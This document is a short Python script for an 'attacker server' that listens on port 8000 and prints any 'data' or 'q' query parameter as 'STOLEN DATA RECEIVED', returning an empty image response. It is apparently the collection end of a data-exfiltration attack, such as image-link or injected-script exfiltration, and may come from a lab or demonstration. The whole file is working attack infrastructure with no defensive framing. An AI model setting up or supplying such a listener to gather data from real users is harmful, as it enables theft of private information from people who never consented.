import http.server
import socketserver
import urllib.parse
import sys

PORT = 8000

class AttackerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)
        
        if 'data' in query_params:
            print(f"\n[+] STOLEN DATA RECEIVED: {query_params['data'][0]}", flush=True)
        elif 'q' in query_params:
            print(f"\n[+] STOLEN DATA RECEIVED: {query_params['q'][0]}", flush=True)
        else:
            print(f"\n[+] Request received: {self.path}", flush=True)
            
        # Return a 1x1 pixel or 404, doesn't matter for the attack
        self.send_response(200)
        self.send_header("Content-type", "image/png")
        self.end_headers()
        self.wfile.write(b"") # Empty image response

    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        pass

if __name__ == "__main__":
    print(f"[*] Attacker Server listening on port {PORT}...", flush=True)
    try:
        with socketserver.TCPServer(("", PORT), AttackerHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
